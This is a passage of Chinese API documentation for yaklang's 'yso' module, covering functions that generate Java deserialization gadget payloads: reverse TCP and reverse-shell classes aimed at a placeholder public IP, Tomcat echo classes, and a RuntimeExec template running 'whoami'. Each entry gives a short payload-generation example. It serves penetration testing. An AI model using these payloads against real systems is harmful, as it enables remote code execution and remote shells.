
## 93. `yso.useTcpReverseEvilClass`

## 功能描述

设置生成TcpReverse类的模板，同时设置指定的tcpReverseHost和tcpReversePort。

## 参数说明

```
func useTcpReverseEvilClass(host: string, port: number) => => GenClassOptionFun
```

**请求参数**

- `host` : 要设置的tcpReverseHost的host。
- `port` : 要设置的tcpReversePort的port。

**返回类型**

- `r1` : 返回一个GenClassOptionFun类型的值。

## 示例代码

### 基础用法

设置公网IP为host，端口号为8080，并生成TcpReverse类模板。

```yaklang
host = '公网IP'
token = uuid()
yso.GetCommonsBeanutils1JavaObject(yso.useTcpReverseEvilClass(host, 8080), yso.tcpReverseToken(token))
```

## 94. `yso.useTcpReverseShellEvilClass`

## 功能描述

设置生成TcpReverseShell类的模板，同时设置指定的 tcpReverseShellHost 和 tcpReverseShellPort。

## 参数说明

```
func useTcpReverseShellEvilClass(host: string, port: number) => => GenClassOptionFun
```

**请求参数**

- `host` : 要设置的 tcpReverseShellHost 的host。
- `port` : 要设置的 tcpReverseShellPort 的port。

**返回类型**

- `r1` : 生成的 GenClassOptionFun 类型对象。

## 示例代码

### 基础用法

设置公网IP为host，端口号为8080

```yaklang
host = '公网IP';
yso.GetCommonsBeanutils1JavaObject(yso.useTcpReverseShellEvilClass(host, 8080));
```

## 95. `yso.useTcpReverseShellTemplate`

## 功能描述

SetClassTcpReverseShellTemplate

## 参数说明

```
func GenClassOptionFun useTcpReverseShellTemplate()
```

**请求参数**

- `无` : 无

**返回类型**

- `r1` : 生成TcpReverseShell类的模板设置函数

## 示例代码

### 基础用法

设置生成TcpReverseShell类的模板

```yaklang
host = '公网IP'
yso.GetCommonsBeanutils1JavaObject(yso.useTcpReverseShellTemplate(),yso.tcpReverseShellHost(host),yso.tcpReverseShellPort(8080))
```

## 96. `yso.useTcpReverseTemplate`

## 功能描述

设置生成TcpReverse类的模板，配合tcpReverseHost和tcpReversePort使用，需要配合tcpReverseToken使用。

## 参数说明

```
func useTcpReverseTemplate() => GenClassOptionFun
```

**请求参数**

- `无` : 无

**返回类型**

- `r1` : 返回一个GenClassOptionFun类型的值，用于设置生成TcpReverse类的模板

## 示例代码

### 基础用法

设置生成TcpReverse类的模板示例

```yaklang
host = '公网IP'
token = uuid()
yso.GetCommonsBeanutils1JavaObject(yso.useTcpReverseTemplate(), yso.tcpReverseHost(host), yso.tcpReversePort(8080), yso.tcpReverseToken(token))
```

## 97. `yso.useTemplate`

## 功能描述

设置要生成的类类型

## 参数说明

```
func useTemplate(t: ClassType) => => GenClassOptionFun
```

**请求参数**

- `t` : 要生成的类类型

**返回类型**

- `r1` : 生成类选项函数

## 示例代码

### 基础用法

设置要生成的类类型为RuntimeExec

```yaklang
classObj,_ = yso.GenerateClass(yso.useTemplate('RuntimeExec'))
```

## 98. `yso.useTomcatEchoEvilClass`

## 功能描述

设置 TomcatEcho 类，需要配合 useHeaderParam 或 useEchoBody、useParam 使用。

## 参数说明

```
func useTomcatEchoEvilClass() => GenClassOptionFun
```

**请求参数**


**返回类型**

- `r1` : GenClassOptionFun 类型，用于设置 TomcatEcho 类

## 示例代码

### 基础用法

body 回显

```yaklang
bodyClassObj,_ = yso.GetCommonsBeanutils1JavaObject(yso.useTomcatEchoEvilClass(),yso.useEchoBody(),yso.useParam("Body Echo Check"))
```

header 回显

```yaklang
headerClassObj,_ = yso.GetCommonsBeanutils1JavaObject(yso.useTomcatEchoEvilClass(),yso.useHeaderParam("Echo","Header Echo Check"))
```

## 99. `yso.useTomcatEchoTemplate`

## 功能描述

SetClassTomcatEchoTemplate

## 参数说明

```
func useTomcatEchoTemplate() => GenClassOptionFun
```

**请求参数**

- `无` : 无

**返回类型**

- `r1` : 生成TomcatEcho类的模板函数

## 示例代码

### 基础用法

body回显示例

```yaklang
bodyClassObj,_ = yso.GetCommonsBeanutils1JavaObject(yso.useTomcatEchoTemplate(),yso.useEchoBody(),yso.useParam('Body Echo Check'))
```

header回显示例

```yaklang
headerClassObj,_ = yso.GetCommonsBeanutils1JavaObject(yso.useTomcatEchoTemplate(),yso.useHeaderParam('Echo','Header Echo Check'))
```

## 100. `yso.command`

## 功能描述

设置要执行的命令的请求参数选项函数，配合 useRuntimeExecTemplate 使用

## 参数说明

```
func command(cmd: string) => = GenClassOptionFun
```

**请求参数**

- `cmd` : 要执行的命令，类型为string

**返回类型**

- `r1` : 返回一个GenClassOptionFun类型的函数

## 示例代码

### 基础用法

设置要执行的命令为 whoami

```yaklang
yso.GetCommonsBeanutils1JavaObject(yso.command('whoami'), yso.useRuntimeExecTemplate())
```

